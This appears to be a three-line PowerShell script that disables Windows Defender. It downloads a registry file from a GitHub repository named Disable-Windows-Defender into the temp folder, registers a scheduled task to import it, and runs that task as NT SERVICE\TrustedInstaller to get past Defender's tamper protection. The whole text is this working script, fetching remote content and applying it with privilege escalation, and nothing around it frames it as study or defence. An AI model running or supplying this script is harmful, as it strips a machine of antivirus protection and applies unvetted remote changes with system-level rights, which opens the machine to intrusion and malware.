irm raw.githubusercontent.com/GabiNun/Disable-Windows-Defender/main/Test.ps1 -o $Env:Temp\Defender.reg
Register-ScheduledTask Defender -Action (New-ScheduledTaskAction reg.exe "import $env:TEMP\Defender.reg")|Out-Null
$o=New-Object -Com 'Schedule.Service';$o.Connect();$o.GetFolder('\').GetTask('Defender').RunEx($null,0,0,'NT SERVICE\TrustedInstaller')|Out-Null
